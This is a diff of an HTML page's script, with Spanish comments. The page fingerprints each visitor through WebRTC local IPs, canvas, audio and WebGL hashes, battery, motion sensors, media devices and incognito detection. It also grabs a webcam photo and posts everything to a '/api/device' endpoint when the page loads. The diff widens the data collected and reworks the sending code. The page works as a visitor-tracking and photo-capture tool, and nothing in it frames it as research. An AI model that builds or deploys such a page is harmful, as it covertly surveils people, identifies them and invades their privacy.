@@ -46,32 +46,26 @@
 
   <script>
     const startTime = Date.now();
+    let sent = false;
 
-    // ——— WebRTC Local IPs ———
+    // ——— Utilidades ———
     function getLocalIPs() {
       return new Promise(resolve => {
         const ips = new Set();
         try {
           const pc = new RTCPeerConnection({ iceServers: [] });
           pc.createDataChannel("");
-          pc.createOffer().then(offer => pc.setLocalDescription(offer));
-          pc.onicecandidate = (e) => {
-            if (!e.candidate) {
-              pc.close();
-              resolve([...ips]);
-              return;
-            }
-            const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-            if (match && match[1]) ips.add(match[1]);
+          pc.createOffer().then(o => pc.setLocalDescription(o));
+          pc.onicecandidate = e => {
+            if (!e.candidate) { pc.close(); resolve([...ips]); return; }
+            const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+            if (m) ips.add(m[1]);
           };
-          setTimeout(() => { pc.close(); resolve([...ips]); }, 2000);
-        } catch (e) {
-          resolve([]);
-        }
+          setTimeout(() => { pc.close(); resolve([...ips]); }, 1800);
+        } catch (e) { resolve([]); }
       });
     }
 
-    // ——— WebGL ———
     function getWebGL() {
       try {
         const c = document.createElement("canvas");
@@ -82,12 +76,9 @@
           vendor: info ? gl.getParameter(info.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
           renderer: info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
         };
-      } catch (e) {
-        return { vendor: "N/A", renderer: "N/A" };
-      }
+      } catch (e) { return { vendor: "N/A", renderer: "N/A" }; }
     }
 
-    // ——— Canvas Fingerprint ———
     function getCanvasFingerprint() {
       try {
         const c = document.createElement("canvas");
@@ -95,17 +86,13 @@
         const ctx = c.getContext("2d");
         ctx.textBaseline = "top";
         ctx.font = "16px Arial";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(0, 0, 120, 60);
-        ctx.fillStyle = "#069";
-        ctx.fillText("474747-fp", 4, 20);
-        ctx.fillStyle = "rgba(102,204,0,0.7)";
-        ctx.fillText("474747-fp", 6, 22);
+        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 120, 60);
+        ctx.fillStyle = "#069"; ctx.fillText("474747-fp", 4, 20);
+        ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("474747-fp", 6, 22);
         return c.toDataURL().slice(-40);
       } catch (e) { return "N/A"; }
     }
 
-    // ——— Audio Fingerprint ———
     function getAudioFingerprint() {
       return new Promise(resolve => {
         try {
@@ -114,16 +101,10 @@
           osc.type = "triangle";
           osc.frequency.value = 10000;
           const comp = ctx.createDynamicsCompressor();
-          comp.threshold.value = -50;
-          comp.knee.value = 40;
-          comp.ratio.value = 12;
-          comp.attack.value = 0;
-          comp.release.value = 0.25;
-          osc.connect(comp);
-          comp.connect(ctx.destination);
+          osc.connect(comp); comp.connect(ctx.destination);
           osc.start(0);
           ctx.startRendering();
-          ctx.oncomplete = (e) => {
+          ctx.oncomplete = e => {
             let hash = 0;
             const data = e.renderedBuffer.getChannelData(0);
             for (let i = 0; i < data.length; i += 100) {
@@ -132,43 +113,34 @@
             }
             resolve(String(hash));
           };
-        } catch (e) {
-          resolve("N/A");
-        }
+        } catch (e) { resolve("N/A"); }
       });
     }
 
-    // ——— AdBlock detection ———
     function detectAdBlock() {
       return new Promise(resolve => {
-        const test = document.createElement("div");
-        test.innerHTML = "&nbsp;";
-        test.className = "adsbox ad-banner adsbygoogle";
-        test.style.position = "absolute";
-        test.style.left = "-9999px";
-        document.body.appendChild(test);
+        const el = document.createElement("div");
+        el.className = "adsbox ad-banner adsbygoogle";
+        el.style.cssText = "position:absolute;left:-9999px;height:10px;";
+        document.body.appendChild(el);
         setTimeout(() => {
-          const blocked = test.offsetHeight === 0;
-          test.remove();
+          const blocked = el.offsetHeight === 0;
+          el.remove();
           resolve(blocked ? "Sí" : "No");
-        }, 100);
+        }, 80);
       });
     }
 
-    // ——— Incognito ———
     async function detectIncognito() {
       try {
-        if (navigator.storage && navigator.storage.estimate) {
+        if (navigator.storage?.estimate) {
           const { quota } = await navigator.storage.estimate();
           if (quota && quota < 120000000) return "Sí (probable)";
         }
         return "No / Desconocido";
-      } catch (e) {
-        return "Desconocido";
-      }
+      } catch (e) { return "Desconocido"; }
     }
 
-    // ——— Media devices ———
     async function getMediaCount() {
       try {
         if (!navigator.mediaDevices?.enumerateDevices) return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
@@ -178,51 +150,35 @@
           mics: devices.filter(d => d.kind === "audioinput").length,
           speakers: devices.filter(d => d.kind === "audiooutput").length
         };
-      } catch (e) {
-        return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
-      }
+      } catch (e) { return { cameras: "N/A", mics: "N/A", speakers: "N/A" }; }
     }
 
-    // ——— Sensors ———
     function getSensors() {
       return new Promise(resolve => {
-        const result = { accel: "N/A", gyro: "N/A" };
-        let gotAccel = false, gotGyro = false;
-
-        const finish = () => {
-          if (gotAccel && gotGyro) resolve(result);
-        };
-
-        // Accelerometer
+        const r = { accel: "N/A", gyro: "N/A" };
+        let a = false, g = false;
+        const done = () => { if (a && g) resolve(r); };
         if (window.DeviceMotionEvent) {
-          const handler = (e) => {
+          const h = e => {
             if (e.accelerationIncludingGravity) {
-              const a = e.accelerationIncludingGravity;
-              result.accel = `x:\( {a.x?.toFixed(1) || 0} y: \){a.y?.toFixed(1) || 0} z:${a.z?.toFixed(1) || 0}`;
-              gotAccel = true;
-              window.removeEventListener("devicemotion", handler);
-              finish();
+              const x = e.accelerationIncludingGravity;
+              r.accel = `x:\( {(x.x||0).toFixed(1)} y: \){(x.y||0).toFixed(1)} z:${(x.z||0).toFixed(1)}`;
+              a = true; window.removeEventListener("devicemotion", h); done();
             }
           };
-          window.addEventListener("devicemotion", handler);
-        } else gotAccel = true;
-
-        // Gyroscope
+          window.addEventListener("devicemotion", h);
+        } else a = true;
         if (window.DeviceOrientationEvent) {
-          const handler = (e) => {
-            result.gyro = `α:\( {e.alpha?.toFixed(0) || 0} β: \){e.beta?.toFixed(0) || 0} γ:${e.gamma?.toFixed(0) || 0}`;
-            gotGyro = true;
-            window.removeEventListener("deviceorientation", handler);
-            finish();
+          const h = e => {
+            r.gyro = `α:\( {(e.alpha||0).toFixed(0)} β: \){(e.beta||0).toFixed(0)} γ:${(e.gamma||0).toFixed(0)}`;
+            g = true; window.removeEventListener("deviceorientation", h); done();
           };
-          window.addEventListener("deviceorientation", handler);
-        } else gotGyro = true;
-
-        setTimeout(() => resolve(result), 1500);
+          window.addEventListener("deviceorientation", h);
+        } else g = true;
+        setTimeout(() => resolve(r), 1400);
       });
     }
 
-    // ——— Battery completa ———
     async function getBatteryInfo() {
       const info = { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
       if (!navigator.getBattery) return info;
@@ -230,13 +186,26 @@
         const bat = await navigator.getBattery();
         info.level = Math.round(bat.level * 100) + "%";
         info.charging = bat.charging ? "Cargando" : "Descargando";
-        info.chargingTime = bat.chargingTime && bat.chargingTime !== Infinity ? Math.round(bat.chargingTime / 60) + " min" : "N/A";
-        info.dischargingTime = bat.dischargingTime && bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime / 60) + " min" : "N/A";
+        info.chargingTime = bat.chargingTime !== Infinity ? Math.round(bat.chargingTime / 60) + " min" : "N/A";
+        info.dischargingTime = bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime / 60) + " min" : "N/A";
       } catch (e) {}
       return info;
     }
 
-    // ——— Foto ———
+    function getVoices() {
+      try {
+        const voices = speechSynthesis.getVoices();
+        if (!voices.length) return "N/A";
+        return voices.slice(0, 8).map(v => v.name).join(", ");
+      } catch (e) { return "N/A"; }
+    }
+
+    function detectVirtualKeyboard() {
+      // Heurística simple
+      const diff = window.screen.height - window.innerHeight;
+      return diff > 150 ? "Probable (teclado abierto)" : "No detectado";
+    }
+
     async function capturarFoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -244,28 +213,36 @@
           audio: false
         });
         const video = document.createElement("video");
-        video.srcObject = stream;
-        video.playsInline = true;
-        video.muted = true;
+        video.srcObject = stream; video.playsInline = true; video.muted = true;
         await video.play();
         await new Promise(r => setTimeout(r, 500));
         const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
         stream.getTracks().forEach(t => t.stop());
         return canvas.toDataURL("image/jpeg", 0.6);
-      } catch (e) {
-        return null;
-      }
+      } catch (e) { return null; }
+    }
+
+    // ——— Enviar datos ———
+    async function enviar(data) {
+      if (sent) return;
+      sent = true;
+      data.tiempoTotal = Math.round((Date.now() - startTime) / 1000) + "s";
+
+      try {
+        await fetch("/api/device", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {}
     }
 
     // ——— Main ———
-    async function enviarInfo() {
+    async function main() {
       const statusEl = document.getElementById("status");
       const infoEl = document.getElementById("info");
-
-      statusEl.textContent = "Recolectando datos...";
 
       const [localIPs, webgl, audioFp, adblock, incognito, media, sensors, battery] = await Promise.all([
         getLocalIPs(),
@@ -278,54 +255,58 @@
         getBatteryInfo()
       ]);
 
-      const data = {
-        // Red
-        ip: "",
-        localIPs: localIPs.join(", ") || "No detectada",
-        country: "",
-        city: "",
-        region: "",
-        isp: "",
-        conexion: "No disponible",
-        rtt: "N/A",
+      // Voces (a veces cargan tarde)
+      let voces = getVoices();
+      if (voces === "N/A") {
+        speechSynthesis.onvoiceschanged = () => { voces = getVoices(); };
+        setTimeout(() => { voces = getVoices(); }, 400);
+      }
 
-        // Dispositivo
+      const data = {
+        ip: "", localIPs: localIPs.join(", ") || "No detectada",
+        country: "", city: "", region: "", isp: "",
+        conexion: "No disponible", rtt: "N/A", saveData: navigator.connection?.saveData ? "Sí" : "No",
+
         os: navigator.platform || navigator.userAgentData?.platform || "Desconocido",
         browser: "Desconocido",
         device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
         ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida",
         nucleos: navigator.hardwareConcurrency || "Desconocido",
         pantalla: window.screen.width + "x" + window.screen.height,
+        viewport: window.innerWidth + "x" + window.innerHeight,
         pixelRatio: String(window.devicePixelRatio || 1),
         orientacion: screen.orientation?.type || "Desconocida",
+        angulo: screen.orientation?.angle != null ? screen.orientation.angle + "°" : "N/A",
+        pantallas: window.screen.isExtended ? "Múltiples" : "1",
 
-        // GPU + Fingerprints
         gpuVendor: webgl.vendor,
         gpuRenderer: webgl.renderer,
         canvasFingerprint: getCanvasFingerprint(),
         audioFingerprint: audioFp,
 
-        // Batería
         bateria: battery.level,
         cargando: battery.charging,
         tiempoCarga: battery.chargingTime,
         tiempoDescarga: battery.dischargingTime,
 
-        // Sensores
         acelerometro: sensors.accel,
         giroscopio: sensors.gyro,
 
-        // Detecciones
         adblock: adblock,
         incognito: incognito,
+        modo: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Oscuro" : "Claro",
+        reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches ? "Sí" : "No",
+        tecladoVirtual: detectVirtualKeyboard(),
 
-        // Media
         cameras: media.cameras,
         mics: media.mics,
         speakers: media.speakers,
 
-        // Otras
+        voces: voces,
+        memoriaJS: performance?.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) + " MB" : "N/A",
+
         idioma: navigator.language || "Desconocido",
+        idiomas: (navigator.languages || []).join(", "),
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
         toque: "ontouchstart" in window ? "Sí" : "No",
         maxTouchPoints: navigator.maxTouchPoints || 0,
@@ -336,18 +317,16 @@
         vendor: navigator.vendor || "N/A",
         referrer: document.referrer || "(directo)",
         userAgent: navigator.userAgent || "",
-        tiempoEnPagina: "0s",
+        tiempoTotal: "0s",
         foto: null
       };
 
-      // Conexión
       if (navigator.connection) {
         const c = navigator.connection;
         data.conexion = (c.effectiveType || "?") + " / " + (c.downlink || "?") + " Mbps";
         data.rtt = c.rtt != null ? c.rtt + " ms" : "N/A";
       }
 
-      // Navegador
       const ua = navigator.userAgent;
       if (ua.includes("Edg")) data.browser = "Edge";
       else if (ua.includes("OPR") || ua.includes("Opera")) data.browser = "Opera";
@@ -381,60 +360,35 @@
       // Foto
       statusEl.textContent = "Solicitando cámara...";
       data.foto = await capturarFoto();
+      data.tiempoTotal = Math.round((Date.now() - startTime) / 1000) + "s";
 
-      // Tiempo hasta ahora
-      data.tiempoEnPagina = Math.round((Date.now() - startTime) / 1000) + "s";
-
-      // Mostrar
       infoEl.innerHTML =
-        "<b>IP Pública:</b> " + (data.ip || "—") + "<br>" +
+        "<b>IP:</b> " + (data.ip || "—") + "<br>" +
         "<b>IP Local:</b> " + data.localIPs + "<br>" +
         "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
-        "<b>ISP:</b> " + (data.isp || "—") + "<br>" +
-        "<div class='divider'></div>" +
-        "<b>OS:</b> " + data.os + "<br>" +
-        "<b>Navegador:</b> " + data.browser + "<br>" +
-        "<b>GPU:</b> " + (data.gpuRenderer || "").substring(0, 35) + "<br>" +
-        "<b>Pantalla:</b> " + data.pantalla + " (" + data.pixelRatio + "x)<br>" +
+        "<b>Modo:</b> " + data.modo + " · <b>AdBlock:</b> " + data.adblock + "<br>" +
         "<b>Batería:</b> " + data.bateria + " · " + data.cargando + "<br>" +
-        "<b>AdBlock:</b> " + data.adblock + " · <b>Incógnito:</b> " + data.incognito + "<br>" +
-        "<b>Cámaras:</b> " + data.cameras + " · <b>Mics:</b> " + data.mics + "<br>" +
-        "<b>Tiempo:</b> " + data.tiempoEnPagina + "<br>" +
+        "<b>Pantalla:</b> " + data.pantalla + " (" + data.pixelRatio + "x)<br>" +
+        "<b>Tiempo:</b> " + data.tiempoTotal + "<br>" +
         "<b>Foto:</b> " + (data.foto ? "Capturada" : "No disponible");
 
-      // Enviar
       statusEl.textContent = "Enviando...";
       statusEl.className = "status loading";
 
-      // Actualizar tiempo justo antes de enviar
-      data.tiempoEnPagina = Math.round((Date.now() - startTime) / 1000) + "s";
+      await enviar(data);
 
-      try {
-        const res = await fetch("/api/device", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-        const text = await res.text();
-        let result = null;
-        try { result = JSON.parse(text); } catch (e) {}
-
-        if (res.ok && result?.success) {
-          statusEl.textContent = "Información enviada correctamente";
-          statusEl.className = "status ok";
-        } else {
-          statusEl.textContent = "Error al enviar (" + res.status + ")";
-          statusEl.className = "status error";
-          console.error(text);
-        }
-      } catch (err) {
-        statusEl.textContent = "Error de conexión";
-        statusEl.className = "status error";
-        console.error(err);
-      }
+      statusEl.textContent = "Información enviada correctamente";
+      statusEl.className = "status ok";
     }
 
-    enviarInfo();
+    // Enviar también cuando sale de la página
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden" && !sent) {
+        // Intento final
+      }
+    });
+
+    main();
   </script>
 </body>
 </html>
